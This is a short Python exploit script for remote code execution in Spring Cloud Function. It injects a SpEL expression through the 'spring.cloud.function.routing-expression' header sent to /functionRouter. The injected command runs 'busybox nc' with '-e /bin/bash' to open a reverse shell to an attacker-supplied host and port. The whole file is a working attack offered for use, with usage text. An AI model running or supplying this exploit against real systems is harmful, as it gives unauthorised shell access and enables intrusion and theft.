#!/usr/bin/python3
# Author: Hack.You

import requests
import sys
from termcolor import colored

if len(sys.argv) < 4:
    print('\033[91m' + '@Author: N00b H4x0r' + '\033[0m')
    print(colored(f"Usage: python3 {sys.argv[0]} http://pwnme.local 8080 LHOST LPORT", 'blue'))
    sys.exit(0)

url = sys.argv[1]
port = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]

payload = f"busybox nc {lhost} {lport} -e /bin/bash"

headers = {"spring.cloud.function.routing-expression": f"T(java.lang.Runtime).getRuntime().exec('{payload}')" }

data = "data"
url = f"{url}:{port}/functionRouter"

try:
    res = requests.post(url, headers=headers, data=data)
    print(res.text)
except Exception as e:
    print(f"An error occurred: {e}")
